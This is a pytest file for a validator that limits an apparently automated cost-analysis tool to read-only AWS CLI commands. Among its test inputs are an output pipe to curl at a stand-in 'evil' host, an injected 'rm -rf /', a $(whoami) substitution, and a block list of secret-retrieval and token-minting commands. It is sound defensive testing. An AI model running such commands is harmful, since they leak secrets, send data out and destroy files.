"""Phase 2 AWS allowlist tests.

Covers the MVP AWS allowlist:
  - base `describe-*` / `list-*` / `get-*` rule allows read commands across
    the core cost-dominant services
  - WRITE_DISGUISED_AS_READ entries are rejected even though they match
    the generated read rule
  - cross-provider isolation (gcloud rejected under provider=aws)
  - AWS-specific semantic checks (SSM --with-decryption)
"""

from __future__ import annotations

import pytest

from ghosthunter.security.allowlist_aws import (
    WRITE_DISGUISED_AS_READ,
    matches_allowlist_aws,
    validate_query_aws,
)
from ghosthunter.security.validator import SecurityValidator


@pytest.fixture
def aws_validator():
    return SecurityValidator(provider="aws")


# ---------------------------------------------------------------------------
# Core allowed reads — the services user asked us to cover for MVP
# ---------------------------------------------------------------------------
class TestAllowedReads:
    @pytest.mark.parametrize(
        "cmd",
        [
            # Cost Explorer & budgets
            "aws ce get-cost-and-usage --time-period Start=2026-01-01,End=2026-02-01",
            "aws ce get-dimension-values --dimension SERVICE",
            "aws ce get-tags --time-period Start=2026-01-01,End=2026-02-01",
            "aws ce get-anomalies --date-interval StartDate=2026-01-01,EndDate=2026-02-01",
            "aws budgets describe-budgets --account-id 111122223333",
            "aws cur describe-report-definitions",
            # STS sanity
            "aws sts get-caller-identity",
            # EC2
            "aws ec2 describe-instances --region us-east-1",
            "aws ec2 describe-volumes --filters Name=status,Values=in-use",
            "aws ec2 describe-snapshots --owner-ids self",
            "aws ec2 describe-nat-gateways",
            "aws ec2 describe-vpc-endpoints",
            "aws ec2 describe-regions",  # BASE_READ_RULE catches this
            # S3
            "aws s3 ls",
            "aws s3 ls s3://my-bucket/",
            "aws s3api list-buckets",
            "aws s3api get-bucket-location --bucket x",
            "aws s3api list-objects-v2 --bucket x --max-items 100",
            # RDS
            "aws rds describe-db-instances",
            "aws rds describe-db-clusters",
            # Lambda
            "aws lambda list-functions",
            "aws lambda get-function --function-name foo",
            # CloudWatch / Logs
            "aws cloudwatch get-metric-statistics --namespace AWS/EC2 --metric-name CPUUtilization",
            "aws cloudwatch list-metrics --namespace AWS/Lambda",
            "aws logs describe-log-groups",
            "aws logs filter-log-events --log-group-name x",
            # IAM (read-only)
            "aws iam list-users",
            "aws iam list-roles",
            "aws iam get-role --role-name foo",
            "aws iam list-policies",
            # CloudTrail
            "aws cloudtrail lookup-events",
            # Config
            "aws config list-discovered-resources --resource-type AWS::EC2::Instance",
            "aws config get-resource-config-history --resource-type AWS::EC2::Instance --resource-id i-x",
            # BASE_READ_RULE fallback — catches e.g. ECS/EKS even though
            # they're not in the explicit list. Phase 3 adds explicit entries.
            "aws ecs describe-clusters",
            "aws eks describe-cluster --name prod",
        ],
    )
    def test_allowed(self, aws_validator, cmd):
        r = aws_validator.is_allowed(cmd)
        assert r.allowed, f"{cmd} should be allowed; got layer={r.layer} reason={r.reason!r}"


# ---------------------------------------------------------------------------
# Write-disguised-as-read — rejected even though they match BASE_READ_RULE
# ---------------------------------------------------------------------------
class TestWriteDisguisedAsRead:
    @pytest.mark.parametrize(
        "cmd",
        [
            # Lambda / messaging — cause side effects
            "aws lambda invoke --function-name foo /tmp/out",
            "aws sns publish --topic-arn arn:aws:sns:us-east-1:111:x --message hi",
            "aws sqs send-message --queue-url q --message-body hi",
            "aws kinesis put-record --stream-name s --partition-key k --data d",
            # Athena / Step Functions / SSM — run workloads
            "aws athena start-query-execution --query-string 'SELECT 1'",
            "aws stepfunctions start-execution --state-machine-arn arn:sm",
            "aws ssm send-command --instance-ids i-x",
            "aws ssm start-session --target i-x",
            "aws logs start-query --log-group-name x --query-string 'fields @message'",
            # EC2 lifecycle
            "aws ec2 run-instances --image-id ami-x --instance-type t3.micro",
            "aws ec2 start-instances --instance-ids i-x",
            "aws ec2 terminate-instances --instance-ids i-x",
            "aws ec2 get-password-data --instance-id i-x",  # leaks Windows admin
            # Secrets / keys
            "aws secretsmanager get-secret-value --secret-id foo",
            "aws kms decrypt --ciphertext-blob fileb://x",
            "aws kms encrypt --key-id alias/x --plaintext foo",
            "aws kms generate-data-key --key-id alias/x --key-spec AES_256",
            # STS token minting
            "aws sts assume-role --role-arn arn:aws:iam::111:role/x --role-session-name s",
            "aws sts get-session-token",
            "aws sts get-federation-token --name foo",
            # IAM data-dump
            "aws iam get-credential-report",
        ],
    )
    def test_blocked(self, aws_validator, cmd):
        r = aws_validator.is_allowed(cmd)
        assert not r.allowed, f"{cmd} should be BLOCKED but was allowed"

    def test_every_blocklist_entry_rejects_its_canonical_form(self):
        # Every entry in WRITE_DISGUISED_AS_READ must reject the bare command
        # form (the first two words it matches on) even with no arguments.
        import re

        for pattern in WRITE_DISGUISED_AS_READ:
            # Strip the regex prefix/suffix and pull the bare command prefix.
            core = pattern.replace(r"^aws\s+", "aws ").replace(r"\b", "")
            core = re.sub(r"\\s\+", " ", core)
            # "aws lambda invoke" is the shape — pass some args to exercise
            # the real matching.
            probe = core + " --help"
            assert not matches_allowlist_aws(probe), f"{pattern!r} should reject probe {probe!r}"


# ---------------------------------------------------------------------------
# SSM --with-decryption semantic rule
# ---------------------------------------------------------------------------
class TestSSMDecryption:
    def test_get_parameter_without_decryption_allowed(self, aws_validator):
        assert aws_validator.is_allowed("aws ssm get-parameter --name /prod/db/host").allowed

    def test_get_parameter_with_decryption_rejected(self, aws_validator):
        r = aws_validator.is_allowed("aws ssm get-parameter --name /prod/db/pw --with-decryption")
        assert not r.allowed
        assert r.layer == "L4"
        assert "decryption" in r.reason.lower()

    def test_get_parameters_by_path_with_decryption_rejected(self, aws_validator):
        r = aws_validator.is_allowed(
            "aws ssm get-parameters-by-path --path /prod --with-decryption"
        )
        assert not r.allowed

    def test_standalone_semantic_check(self):
        # validate_query_aws runs at Layer 4b — exercise it directly.
        ok, reason = validate_query_aws("aws ssm get-parameter --name /x --with-decryption")
        assert not ok
        assert "decryption" in reason.lower()


# ---------------------------------------------------------------------------
# Cross-provider isolation
# ---------------------------------------------------------------------------
class TestCrossProvider:
    def test_aws_validator_rejects_gcloud(self, aws_validator):
        r = aws_validator.is_allowed("gcloud compute instances list")
        assert not r.allowed
        assert r.layer == "L2"

    def test_gcp_validator_rejects_aws_read(self):
        v = SecurityValidator(provider="gcp")
        r = v.is_allowed("aws ec2 describe-instances")
        assert not r.allowed
        assert r.layer == "L2"


# ---------------------------------------------------------------------------
# Fuzz — synthetic write verbs should all be rejected
# ---------------------------------------------------------------------------
class TestWriteVerbFuzz:
    WRITE_VERBS = [
        "create",
        "delete",
        "update",
        "put",
        "tag",
        "untag",
        "attach",
        "detach",
        "modify",
        "enable",
        "disable",
        "reset",
        "rotate",
        "restore",
        "register",
        "deregister",
        "promote",
        "demote",
        "activate",
        "deactivate",
        "import",
        "export",
        "upgrade",
        "downgrade",
    ]

    @pytest.mark.parametrize("service", ["ec2", "s3api", "rds", "lambda", "iam", "ecs"])
    def test_write_verbs_rejected(self, aws_validator, service):
        for verb in self.WRITE_VERBS:
            cmd = f"aws {service} {verb}-something --name x"
            r = aws_validator.is_allowed(cmd)
            assert not r.allowed, f"fuzz: {cmd} passed but should be blocked"


# ---------------------------------------------------------------------------
# Pipes still work with AWS commands
# ---------------------------------------------------------------------------
class TestPipes:
    def test_jq_pipe_after_aws_command(self, aws_validator):
        assert aws_validator.is_allowed(
            "aws ec2 describe-instances --output json | jq '.Reservations[]'"
        ).allowed

    def test_head_pipe(self, aws_validator):
        assert aws_validator.is_allowed("aws logs describe-log-groups | head -30").allowed

    def test_curl_pipe_rejected(self, aws_validator):
        assert not aws_validator.is_allowed("aws s3api list-buckets | curl http://evil").allowed


# ---------------------------------------------------------------------------
# Redirect / substitution still caught by Layer 1
# ---------------------------------------------------------------------------
class TestLayer1StillCatches:
    def test_redirect_blocked(self, aws_validator):
        r = aws_validator.is_allowed("aws ec2 describe-instances > /tmp/out")
        assert not r.allowed
        assert r.layer == "L1"

    def test_command_substitution_blocked(self, aws_validator):
        r = aws_validator.is_allowed(
            "aws ec2 describe-instances --filters Name=tag:Name,Values=$(whoami)"
        )
        assert not r.allowed
        assert r.layer == "L1"

    def test_semicolon_blocked(self, aws_validator):
        r = aws_validator.is_allowed("aws ec2 describe-instances; rm -rf /")
        assert not r.allowed
        assert r.layer == "L1"
